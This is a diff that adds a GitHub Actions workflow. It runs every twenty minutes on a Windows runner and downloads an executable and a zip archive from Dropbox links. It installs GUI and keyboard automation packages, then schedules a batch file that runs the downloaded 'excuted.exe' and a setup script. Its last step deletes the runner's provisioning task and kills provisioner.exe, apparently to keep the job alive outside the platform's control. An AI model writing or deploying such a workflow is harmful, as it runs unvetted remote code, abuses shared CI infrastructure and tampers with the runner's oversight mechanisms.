@@ -1,0 +1,39 @@
+name: main-octobergo 
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/20 * * * *' 
+jobs:
+  build:
+    name: Starting
+    runs-on: windows-latest
+    timeout-minutes: 300
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: vpnplanet don
+        run: curl -s -L -o vpnplanet.exe "https://www.dropbox.com/scl/fi/icemmzyitmkm90tmu3yr6/free-vpn-planet-2-8-31-47.exe?rlkey=g417ofy3hhguibyn5wazrc0xt&st=bb05jzej&dl=1"
+      - name: download app
+        run: |
+          curl -s -L -o ex.zip "https://www.dropbox.com/scl/fi/eejs0i006llaeed716gam/ex.zip?rlkey=6b3qyugk5yb91gxm4rnakrlnu&st=wpox3jv9&dl=1"
+          tar -xf ex.zip
+      
+      - name: pyp installations 
+        run: |
+          pip install pyautogui --quiet
+          pip install pynput --quiet
+          $batchFile  = "${{ github.workspace }}\start.bat"
+          echo "@echo off" > start.bat
+          echo "D:"  >> start.bat
+          echo "cd ${{ github.workspace }}" >> start.bat
+          echo "python setup.py" >> start.bat
+          echo "excuted.exe" >> start.bat
+          echo "pause" >> start.bat
+          schtasks /create /tn "mainTask" /tr "$batchFile" /sc once /st $(Get-Date -f 'HH:mm:ss' -date (Get-Date).AddSeconds(60)) /f
+          type start.bat
+
+      - name: Exit
+        run: |
+          schtasks /delete /tn "RunnerMachineProvisioner" /f
+          taskkill /im provisioner.exe
+          
